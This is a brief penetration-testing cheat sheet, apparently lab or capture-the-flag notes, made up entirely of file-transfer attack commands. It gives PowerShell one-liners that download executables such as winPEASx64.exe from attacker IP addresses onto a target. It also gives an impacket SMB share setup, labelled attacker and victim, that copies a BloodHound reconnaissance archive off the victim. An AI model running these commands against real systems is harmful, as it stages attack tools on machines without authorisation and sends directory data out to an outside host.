## Powershell
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.21.62:80/jagelito.exe','jagelito.exe')"
```

```powershell
powershell Invoke-WebRequest -Uri http://[vpnIP]:[LPORT2]/Message.exe -Outfile Message.exe
```

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.14.12:80/winPEASx64.exe','winPEASx64.exe')"
```


## smbserver
ATTACKER MACHINE:
```bash
$ impacket-smbserver share . -smb2support -username aa -password aa
```

VICTIM MACHINE:
```powershell
PS > net use \\10.10.14.12\share /u:aa aa
PS > copy 00000000000000_BloodHound.zip \\10.10.14.12\share\
PS > net use /d \\10.10.14.12\share #REMOVE SHARE.
```